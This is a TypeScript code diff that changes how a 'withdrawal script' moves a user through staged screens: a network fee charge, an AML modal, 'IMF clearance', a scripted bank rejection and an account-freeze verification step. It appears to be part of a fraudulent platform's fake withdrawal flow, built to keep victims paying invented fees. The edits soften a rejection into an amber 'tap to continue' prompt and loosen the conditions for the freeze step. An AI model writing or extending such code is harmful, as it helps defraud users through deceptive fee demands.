@@ -1,4 +1,5 @@
 import type { WithdrawalScriptPhase, WithdrawalRequestStatus } from "@prisma/client";
+import { isWithdrawalScriptCycleComplete } from "@/lib/withdrawal-script";
 
 export type WithdrawalScriptStageAction = "navigate" | "aml-modal" | "none";
 
@@ -46,6 +47,16 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
     clickable: true,
   });
 
+  if (isWithdrawalScriptCycleComplete(withdrawal, userStep)) {
+    return {
+      label: "Rejected",
+      tone: "red",
+      action: "navigate",
+      resumeUrl: `/dashboard/withdrawals/${id}/script/bank-rejected`,
+      clickable: true,
+    };
+  }
+
   if (scriptPhase === "PENDING_TIMER") {
     if (userStep === 1) {
       return navigate("Processing network fee", payChargeUrl(id), "amber");
@@ -57,7 +68,7 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
   }
 
   if (scriptPhase === "BANK_REJECTED") {
-    return navigate("Transfer rejected", `/dashboard/withdrawals/${id}/script/bank-rejected`, "red");
+    return navigate("Transfer rejected — tap to continue", `/dashboard/withdrawals/${id}/script/bank-rejected`, "amber");
   }
 
   if (scriptPhase === "AWAITING_IMF_CLEARANCE") {
@@ -92,7 +103,7 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
     }
   }
 
-  if (userStep === 2 && accountFrozen && scriptPhase === "SCRIPT_COMPLETE" && status === "REJECTED") {
+  if (userStep === 2 && accountFrozen && scriptPhase === "SCRIPT_COMPLETE") {
     return {
       label: "Account verification required",
       tone: "amber",
